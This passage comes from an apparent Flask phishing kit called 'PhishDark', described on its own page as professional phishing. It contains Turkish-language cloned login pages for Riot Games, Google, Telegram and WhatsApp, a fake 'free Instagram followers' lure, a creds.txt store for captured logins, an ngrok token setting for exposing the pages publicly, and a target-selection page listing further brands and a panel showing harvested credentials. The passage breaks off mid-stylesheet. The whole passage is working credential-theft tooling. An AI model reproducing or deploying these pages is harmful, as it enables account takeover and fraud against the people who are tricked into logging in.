    input:focus {
      border-color: var(--valorant-red);
      outline: none;
      box-shadow: 0 0 0 2px rgba(255, 70, 85, 0.3);
    }

    .btn {
      width: 100%;
      padding: 12px;
      background-color: var(--valorant-red);
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: background-color 0.2s;
      letter-spacing: 1px;
    }

    .btn:hover {
      background-color: var(--valorant-dark-red);
    }

    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
      color: var(--valorant-gray);
    }

    .footer a {
      color: var(--valorant-red);
      text-decoration: none;
      margin: 0 5px;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .security-info {
      margin-top: 25px;
      font-size: 13px;
      color: var(--valorant-gray);
      text-align: center;
    }

    .security-info i {
      margin-right: 6px;
    }

    @media (max-width: 500px) {
      .form-container {
        padding: 20px;
      }

      .header h1 {
        font-size: 24px;
      }
      
      .login-container {
        border: none;
        border-radius: 0;
      }
      
      body {
        padding: 0;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="header">
      <div class="logo">
        <img src="https://i.pinimg.com/736x/f5/30/e3/f530e36bc76a899a97ac8557fddd3624.jpg" alt="VALORANT Logo" />
      </div>
      <h1>RIOT GAMES HESABINIZA GİRİŞ YAPIN</h1>
    </div>
    <div class="form-container">
      <h2 class="form-title">GİRİŞ YAP</h2>
      <form method="POST" action="/login">
        <div class="form-group">
          <label for="username">Kullanıcı Adı</label>
          <input
            type="text"
            id="username"
            name="username"
            placeholder="Kullanıcı adınızı giriniz"
            required
          />
        </div>
        <div class="form-group">
          <label for="password">Şifre</label>
          <input type="password" id="password" name="password" placeholder="Şifrenizi giriniz" required />
        </div>
        <button type="submit" class="btn">GİRİŞ YAP</button>
      </form>
      <div class="footer">
        <a href="#">Şifremi Unuttum</a> | 
        <a href="#">Yeni Kullanıcı Kaydı</a>
      </div>
      <div class="security-info">
        <i class="fas fa-lock"></i> Güvenli Giriş - 256 Bit SSL Şifreleme
      </div>
    </div>
  </div>
</body>
</html>
    """,
    
    "google": """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google - Giriş</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --google-blue: #4285f4;
      --google-dark-blue: #3367d6;
      --google-light-blue: #e8f0fe;
      --google-gray: #5f6368;
      --google-light-gray: #f5f5f5;
      --google-white: #ffffff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', Arial, sans-serif;
    }

    body {
      background-color: var(--google-white);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 15px;
    }

    .login-container {
      width: 100%;
      max-width: 450px;
      background-color: var(--google-white);
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
      overflow: hidden;
      padding: 48px 40px 36px;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      height: 32px;
    }

    .form-title {
      font-size: 24px;
      color: #202124;
      font-weight: 400;
      margin-bottom: 10px;
      text-align: center;
    }

    .form-subtitle {
      font-size: 16px;
      color: var(--google-gray);
      font-weight: 400;
      margin-bottom: 40px;
      text-align: center;
    }

    .form-group {
      margin-bottom: 20px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 13px 15px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      transition: border-color 0.3s;
    }

    input:focus {
      border-color: var(--google-blue);
      outline: none;
      box-shadow: 0 0 0 2px var(--google-light-blue);
    }

    .forgot-password {
      font-size: 14px;
      color: var(--google-blue);
      font-weight: 500;
      text-decoration: none;
      display: block;
      margin-bottom: 40px;
    }

    .forgot-password:hover {
      text-decoration: underline;
    }

    .btn-container {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .btn {
      padding: 10px 24px;
      background-color: var(--google-blue);
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn:hover {
      background-color: var(--google-dark-blue);
    }

    .btn-secondary {
      background-color: transparent;
      color: var(--google-blue);
    }

    .btn-secondary:hover {
      background-color: rgba(66, 133, 244, 0.04);
    }

    .footer {
      margin-top: 40px;
      text-align: center;
      font-size: 12px;
      color: var(--google-gray);
    }

    .footer a {
      color: var(--google-blue);
      text-decoration: none;
      margin: 0 5px;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    @media (max-width: 500px) {
      .login-container {
        padding: 24px;
        box-shadow: none;
      }
      
      body {
        background: var(--google-white);
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" />
    </div>
    <h1 class="form-title">Hesabınıza giriş yapın</h1>
    <p class="form-subtitle">Google Hizmetlerini kullanmaya devam edin</p>
    <form method="POST" action="/login">
      <div class="form-group">
        <input
          type="email"
          id="email"
          name="email"
          placeholder="E-posta adresinizi veya telefon numaranızı girin"
          required
        />
      </div>
      <div class="form-group">
        <input type="password" id="password" name="password" placeholder="Şifrenizi girin" required />
      </div>
      <a href="#" class="forgot-password">Şifrenizi mi unuttunuz?</a>
      <div class="btn-container">
        <a href="#" class="btn btn-secondary">Hesap oluştur</a>
        <button type="submit" class="btn">İleri</button>
      </div>
    </form>
    <div class="footer">
      <a href="#">Yardım</a>
      <a href="#">Gizlilik</a>
      <a href="#">Şartlar</a>
    </div>
  </div>
</body>
</html>
    """,
    
    "instagram-takipci": """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ücretsiz Takipçi Kazan</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --ig-gradient: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
      --bg: #fafafa;
      --input-bg: #ffffff;
      --input-border: #dbdbdb;
      --text: #262626;
      --secondary: #8e8e8e;
      --blue: #0095f6;
      --blue-hover: #0077c2;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: var(--bg);
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 350px;
      background-color: var(--input-bg);
      border: 1px solid var(--input-border);
      border-radius: 8px;
      padding: 20px 40px;
      text-align: center;
      margin: 20px 0;
    }

    .logo {
      margin: 22px auto 12px;
      width: 175px;
      background: var(--ig-gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-size: 42px;
      font-weight: 600;
    }

    h1 {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 20px;
    }

    p {
      color: var(--secondary);
      font-size: 14px;
      margin-bottom: 20px;
    }

    .form-group {
      margin-bottom: 12px;
    }

    input {
      width: 100%;
      padding: 12px 8px;
      background: var(--input-bg);
      border: 1px solid var(--input-border);
      border-radius: 4px;
      color: var(--text);
      font-size: 14px;
    }

    input::placeholder {
      color: var(--secondary);
    }

    input:focus {
      outline: none;
      border-color: #a8a8a8;
    }

    button {
      width: 100%;
      padding: 8px;
      background: var(--blue);
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: 600;
      margin-top: 12px;
      font-size: 14px;
      cursor: pointer;
    }

    button:hover {
      background: var(--blue-hover);
    }

    .steps {
      margin: 20px 0;
      text-align: left;
    }

    .step {
      display: flex;
      align-items: center;
      margin-bottom: 12px;
      font-size: 14px;
    }

    .step i {
      margin-right: 8px;
      color: var(--blue);
    }

    .note {
      font-size: 12px;
      color: var(--secondary);
      margin-top: 20px;
    }

    .app-links {
      margin: 20px 0;
      text-align: center;
    }

    .app-links p {
      margin-bottom: 15px;
      font-size: 14px;
      color: var(--secondary);
    }

    .app-stores {
      display: flex;
      justify-content: center;
      gap: 10px;
    }

    .app-stores img {
      height: 40px;
      cursor: pointer;
    }

    @media (max-width: 400px) {
      .container {
        padding: 16px 20px;
        border: none;
        background: var(--bg);
      }
      
      body {
        background: var(--input-bg);
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">Instagram</div>
    <h1>Ücretsiz Takipçi Kazan</h1>
    <p>Instagram hesabınıza ücretsiz takipçi kazanmak için giriş yapın</p>
    <form method="POST" action="/login">
      <div class="form-group">
        <input type="text" name="username" placeholder="Kullanıcı adı veya e-posta" required>
      </div>
      <div class="form-group">
        <input type="password" name="password" placeholder="Şifre" required>
      </div>
      <button type="submit">Giriş Yap ve Takipçi Kazan</button>
    </form>
    <div class="steps">
      <div class="step">
        <i class="fas fa-check-circle"></i>
        <span>Giriş yaptıktan sonra 1000 takipçi kazanacaksınız</span>
      </div>
      <div class="step">
        <i class="fas fa-check-circle"></i>
        <span>Takipçiler 24 saat içinde hesabınıza eklenecek</span>
      </div>
      <div class="step">
        <i class="fas fa-check-circle"></i>
        <span>Tamamen ücretsiz ve güvenli</span>
      </div>
    </div>
    <p class="note">Giriş yaparak kullanım şartlarını ve gizlilik politikasını kabul etmiş olursunuz.</p>
    
    <div class="app-links">
      <div class="app-stores">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_tr-tr.png/4b70f6fae447.png" alt="App Store">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_tr-tr.png/1554e427c5b4.png" alt="Google Play">
      </div>
    </div>
  </div>
</body>
</html>
    """,
    
    "telegram": """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Giriş</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --telegram-blue: #0088cc;
      --telegram-dark-blue: #0077b5;
      --telegram-light-blue: #e6f2fa;
      --telegram-gray: #707579;
      --telegram-light-gray: #f5f5f5;
      --telegram-white: #ffffff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', Arial, sans-serif;
    }

    body {
      background-color: var(--telegram-light-gray);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-container {
      width: 100%;
      max-width: 400px;
      background-color: var(--telegram-white);
      border-radius: 12px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      overflow: hidden;
    }

    .header {
      background-color: var(--telegram-blue);
      padding: 30px;
      text-align: center;
      color: var(--telegram-white);
    }

    .logo {
      font-size: 32px;
      margin-bottom: 10px;
    }

    .header h1 {
      font-size: 24px;
      font-weight: 500;
      margin: 0;
    }

    .form-container {
      padding: 30px;
    }

    .form-title {
      font-size: 20px;
      color: var(--telegram-blue);
      font-weight: 500;
      margin-bottom: 25px;
      text-align: center;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 500;
      color: var(--telegram-gray);
    }

    input[type="text"],
    input[type="tel"],
    input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 6px;
      transition: border-color 0.3s;
    }

    input:focus {
      outline: none;
      border-color: var(--telegram-blue);
      box-shadow: 0 0 0 2px var(--telegram-light-blue);
    }

    .btn {
      width: 100%;
      padding: 12px;
      background-color: var(--telegram-blue);
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn:hover {
      background-color: var(--telegram-dark-blue);
    }

    .country-selector {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
    }

    .country-selector select {
      flex: 1;
      padding: 12px 15px;
      border: 1px solid #ddd;
      border-radius: 6px;
      margin-left: 10px;
    }

    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
      color: var(--telegram-gray);
    }

    .footer a {
      color: var(--telegram-blue);
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    @media (max-width: 500px) {
      .login-container {
        border-radius: 0;
      }
      
      .header {
        padding: 20px;
      }
      
      .form-container {
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="header">
      <div class="logo">
        <i class="fab fa-telegram"></i>
      </div>
      <h1>Telegram'a Giriş Yap</h1>
    </div>
    <div class="form-container">
      <h2 class="form-title">Telefon Numaranızı Girin</h2>
      <form method="POST" action="/login">
        <div class="form-group">
          <div class="country-selector">
            <span>Ülke:</span>
            <select name="country">
              <option value="tr">Türkiye (+90)</option>
              <option value="us">Amerika (+1)</option>
              <option value="de">Almanya (+49)</option>
              <option value="fr">Fransa (+33)</option>
              <option value="gb">İngiltere (+44)</option>
            </select>
          </div>
          <input type="tel" name="phone" placeholder="Telefon numarası" required>
        </div>
        <div class="form-group" id="password-field" style="display:none;">
          <input type="password" name="password" placeholder="Şifre" required>
        </div>
        <button type="submit" class="btn" id="submit-btn">Giriş Yap</button>
      </form>
      <div class="footer">
        <a href="#">Şifremi Unuttum</a> | 
        <a href="#">Yeni Kullanıcı Kaydı</a>
      </div>
    </div>
  </div>

  <script>
    document.querySelector('input[name="phone"]').addEventListener('input', function() {
      const passwordField = document.getElementById('password-field');
      const submitBtn = document.getElementById('submit-btn');
      
      if (this.value.length >= 5) {
        passwordField.style.display = 'block';
        submitBtn.textContent = 'Devam Et';
      } else {
        passwordField.style.display = 'none';
        submitBtn.textContent = 'Giriş Yap';
      }
    });
  </script>
</body>
</html>
    """,
    
    "whatsapp": """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WhatsApp Web</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --whatsapp-green: #25D366;
      --whatsapp-dark-green: #128C7E;
      --whatsapp-light-green: #DCF8C6;
      --whatsapp-gray: #ece5dd;
      --whatsapp-dark-gray: #667781;
      --whatsapp-white: #ffffff;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #e6e6e6;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-container {
      width: 100%;
      max-width: 400px;
      background-color: var(--whatsapp-white);
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      overflow: hidden;
    }

    .header {
      background-color: var(--whatsapp-dark-green);
      padding: 30px;
      text-align: center;
      color: var(--whatsapp-white);
    }

    .logo {
      font-size: 42px;
      margin-bottom: 10px;
    }

    .header h1 {
      font-size: 24px;
      font-weight: 500;
      margin: 0;
    }

    .form-container {
      padding: 30px;
    }

    .form-title {
      font-size: 20px;
      color: var(--whatsapp-dark-green);
      font-weight: 500;
      margin-bottom: 25px;
      text-align: center;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 500;
      color: var(--whatsapp-dark-gray);
    }

    input[type="tel"],
    input[type="text"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 4px;
      transition: border-color 0.3s;
    }

    input:focus {
      outline: none;
      border-color: var(--whatsapp-dark-green);
    }

    .btn {
      width: 100%;
      padding: 12px;
      background-color: var(--whatsapp-green);
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn:hover {
      background-color: var(--whatsapp-dark-green);
    }

    .qr-option {
      text-align: center;
      margin-top: 20px;
    }

    .qr-option a {
      color: var(--whatsapp-dark-green);
      text-decoration: none;
      font-weight: 500;
    }

    .qr-option a:hover {
      text-decoration: underline;
    }

    .footer {
      margin-top: 30px;
      text-align: center;
      font-size: 14px;
      color: var(--whatsapp-dark-gray);
    }

    @media (max-width: 500px) {
      .login-container {
        border-radius: 0;
      }
      
      .header {
        padding: 20px;
      }
      
      .form-container {
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="header">
      <div class="logo">
        <i class="fab fa-whatsapp"></i>
      </div>
      <h1>WhatsApp Web'e Hoş Geldiniz</h1>
    </div>
    <div class="form-container">
      <h2 class="form-title">Telefon Numaranızı Girin</h2>
      <form method="POST" action="/login">
        <div class="form-group">
          <label for="phone">Telefon Numarası</label>
          <input type="tel" id="phone" name="phone" placeholder="Örnek: 5551234567" required>
        </div>
        <div class="form-group" id="code-field" style="display:none;">
          <label for="code">Doğrulama Kodu</label>
          <input type="text" id="code" name="code" placeholder="6 haneli kod">
        </div>
        <button type="submit" class="btn" id="submit-btn">KOD GÖNDER</button>
      </form>
      <div class="qr-option">
        <a href="#" id="qr-toggle">QR Kod ile giriş yap</a>
      </div>
      <div class="footer">
        WhatsApp'ı bilgisayarınızda kullanmak için telefonunuzla eşleştirin.
      </div>
    </div>
  </div>

  <script>
    document.getElementById('phone').addEventListener('input', function() {
      const codeField = document.getElementById('code-field');
      const submitBtn = document.getElementById('submit-btn');
      
      if (this.value.length >= 5) {
        codeField.style.display = 'block';
        submitBtn.textContent = 'GİRİŞ YAP';
      } else {
        codeField.style.display = 'none';
        submitBtn.textContent = 'KOD GÖNDER';
      }
    });
  </script>
</body>
</html>
    """
}

# Kaydedilen veriler için dosya
DATA_FILE = "creds.txt"
NGROK_AUTH_TOKEN = ""  # Kendi ngrok auth token'ınızı buraya ekleyin

@app.route('/')
def index():
    return redirect('/select')

@app.route('/select')
def select():
    return """
 <!DOCTYPE html>
<html>
<head>
    <title>PhishDark - Giriş Sayfası Seçin</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --primary: #4f46e5;
            --primary-dark: #4338ca;
            --dark: #111827;
            --light: #f9fafb;
            --gray: #6b7280;
            --red: #ef4444;
            --green: #10b981;
            --yellow: #f59e0b;
            --netflix-red: #e50914;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #1e293b, #0f172a);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
        }
        .container {
            background: rgba(15, 23, 42, 0.8);
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            padding: 2rem;
            width: 90%;
            max-width: 1000px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
        }
        .header {
            text-align: center;
            margin-bottom: 2rem;
        }
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
            background: linear-gradient(90deg, #4f46e5, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header p {
            color: #94a3b8;
            font-size: 1.1rem;
        }
        .options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1.5rem;
        }
        .option {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            padding: 1.5rem;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }
        .option:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            border-color: var(--primary);
            background: rgba(30, 41, 59, 0.9);
        }
        .option i {
            font-size: 2.5rem;
            margin-bottom: 1rem;
            background: linear-gradient(90deg, #4f46e5, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .option h3 {
            margin: 0;
            color: white;
            font-size: 1.1rem;
            font-weight: 600;
        }
        .option::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(transparent, rgba(79, 70, 229, 0.1), transparent);
            transform: rotate(45deg);
            transition: all 0.6s ease;
            opacity: 0;
        }
        .option:hover::before {
            animation: shine 1.5s;
            opacity: 1;
        }
        @keyframes shine {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        .footer {
            margin-top: 2rem;
            text-align: center;
            font-size: 0.875rem;
            color: #64748b;
        }
        .badge {
            position: absolute;
            top: 10px;
            right: 10px;
            background-color: var(--red);
            color: white;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 0.7rem;
            font-weight: bold;
        }
        .badge.new {
            background-color: var(--green);
        }
        .badge.popular {
            background-color: var(--yellow);
        }

        /* Netflix-style Notification Icon */
        .netflix-notification {
            position: fixed;
            bottom: 25px;
            right: 25px;
            width: 60px;
            height: 60px;
            background: var(--netflix-red);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 1000;
            box-shadow: 0 0 20px rgba(229, 9, 20, 0.5);
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        
        .netflix-notification.active {
            transform: translateY(0);
            opacity: 1;
        }
        
        .netflix-notification i {
            color: white;
            font-size: 1.8rem;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .notification-badge {
            position: absolute;
            top: -5px;
            right: -5px;
            background: white;
            color: var(--netflix-red);
            width: 25px;
            height: 25px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8rem;
            font-weight: bold;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
        }
        
        /* Login Notification Panel */
        .login-panel {
            position: fixed;
            bottom: 100px;
            right: 25px;
            width: 300px;
            background: rgba(20, 20, 20, 0.95);
            border-radius: 10px;
            padding: 15px;
            box-shadow: 0 5px 25px rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.1);
            z-index: 999;
            transform: translateY(20px);
            opacity: 0;
            transition: all 0.3s ease;
        }
        
        .login-panel.active {
            transform: translateY(0);
            opacity: 1;
        }
        
        .login-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .login-header h4 {
            margin: 0;
            color: white;
            font-size: 1.1rem;
        }
        
        .login-header i {
            color: var(--gray);
            cursor: pointer;
        }
        
        .login-item {
            padding: 10px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        
        .login-platform {
            color: var(--netflix-red);
            font-weight: bold;
            font-size: 0.9rem;
        }
        
        .login-credentials {
            font-size: 0.85rem;
            color: var(--gray);
            margin-top: 5px;
        }
        
        /* Responsive Adjustments */
        @media (max-width: 768px) {
            .netflix-notification {
                width: 50px;
                height: 50px;
                bottom: 20px;
                right: 20px;
            }
            
            .netflix-notification i {
                font-size: 1.5rem;
            }
            
            .login-panel {
                width: calc(100% - 40px);
                right: 20px;
                bottom: 90px;
            }
        }
    </style>
</head>
<body>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhishDark v4.0 | Profesyonel Kimlik Avı 2025</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #6a11cb;
            --secondary-color: #2575fc;
            --dark-color: #0f0f1a;
            --darker-color: #0a0a12;
            --light-color: #f8f9fa;
            --lighter-color: #ffffff;
            --success-color: #28a745;
            --danger-color: #ff4d6d;
            --warning-color: #ffc107;
            --info-color: #17a2b8;
            --glass-color: rgba(255, 255, 255, 0.08);
            --glass-border: rgba(255, 255, 255, 0.1);
            --glass-highlight: rgba(255, 255, 255, 0.2);
            --transition-speed: 0.4s;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, var(--dark-color), var(--darker-color));
            color: var(--light-color);
            min-height: 100vh;
            overflow-x: hidden;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1300px;
            margin: 0 auto;
            padding: 30px;
            position: relative;
            z-index: 2;
        }
        
        .header {
            text-align: center;
            margin-bottom: 50px;
            animation: fadeInDown 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
        }
        
        .header h1 {
            font-size: 3.5rem;
            margin-bottom: 15px;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            font-weight: 700;
            letter-spacing: -1px;
        }
        
        .header p {
            font-size: 1.3rem;
            color: rgba(255, 255, 255, 0.85);
            font-weight: 300;
            max-width: 700px;
            margin: 0 auto;
        }
        
        .options-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 25px;
            margin-bottom: 50px;
        }
        
        .option-card {
            background: var(--glass-color);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 18px;
            padding: 30px 20px;
            text-align: center;
            cursor: pointer;
            transition: all var(--transition-speed) ease;
            position: relative;
            overflow: hidden;
            border: 1px solid var(--glass-border);
            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.25);
            z-index: 1;
        }
        
        .option-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, var(--glass-highlight), transparent);
            opacity: 0;
            transition: opacity var(--transition-speed) ease;
            z-index: -1;
        }
        
        .option-card:hover {
            transform: translateY(-8px) scale(1.03);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.35);
            border-color: var(--glass-highlight);
        }
        
        .option-card:hover::before {
            opacity: 1;
        }
        
        .option-icon {
            font-size: 2.8rem;
            margin-bottom: 20px;
            color: white;
            transition: all var(--transition-speed) ease;
            display: inline-block;
        }
        
        .option-card:hover .option-icon {
            transform: scale(1.15) rotate(5deg);
            filter: drop-shadow(0 5px 10px rgba(0, 0, 0, 0.3));
        }
        
        .option-title {
            font-size: 1.3rem;
            font-weight: 600;
            color: white;
            margin-bottom: 5px;
        }
        
        .option-desc {
            font-size: 0.85rem;
            color: rgba(255, 255, 255, 0.7);
            font-weight: 300;
            display: none;
        }
        
        .badge {
            position: absolute;
            top: 15px;
            right: 15px;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            animation: pulse 2s infinite;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .badge.popular {
            background: var(--danger-color);
            color: white;
        }
        
        .badge.new {
            background: var(--success-color);
            color: white;
        }
        
        .badge.pro {
            background: linear-gradient(45deg, #ff8a00, #e52e71);
            color: white;
        }
        
        .footer {
            text-align: center;
            margin-top: 60px;
            padding: 25px;
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.95rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            animation: fadeIn 1.5s ease;
        }
        
        .footer a {
            color: var(--lighter-color);
            text-decoration: none;
            transition: color 0.3s ease;
        }
        
        .footer a:hover {
            color: var(--secondary-color);
            text-decoration: underline;
        }
        
        /* Animations */
        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        
        @keyframes pulse {
            0% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.7);
            }
            50% {
                transform: scale(1.05);
            }
            100% {
                transform: scale(1);
                box-shadow: 0 0 0 12px rgba(220, 53, 69, 0);
            }
        }
        
        /* Floating particles background */
        .particles-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            overflow: hidden;
        }
        
        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.15);
            border-radius: 50%;
            backdrop-filter: blur(2px);
            animation: float linear infinite;
            z-index: 1;
        }
        
        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100px) rotate(720deg);
                opacity: 0;
            }
        }
        
        /* Platform-specific gradient backgrounds */
        .option-card[href="/instagram"] {
            background: linear-gradient(135deg, #405DE6, #833AB4, #E1306C, #FD1D1D);
            background-size: 300% 300%;
            animation: gradientBG 12s ease infinite;
        }
        
        .option-card[href="/facebook"] {
            background: linear-gradient(135deg, #1877F2, #0D5C91);
        }
        
        .option-card[href="/tiktok"] {
            background: linear-gradient(135deg, #000000, #333333);
        }
        
        .option-card[href="/e-ticaret"] {
            background: linear-gradient(135deg, #FF5722, #E64A19);
        }
        
        .option-card[href="/ibb"] {
            background: linear-gradient(135deg, #009688, #00796B);
        }
        
        .option-card[href="/osym"] {
            background: linear-gradient(135deg, #3F51B5, #303F9F);
        }
        
        .option-card[href="/netflix"] {
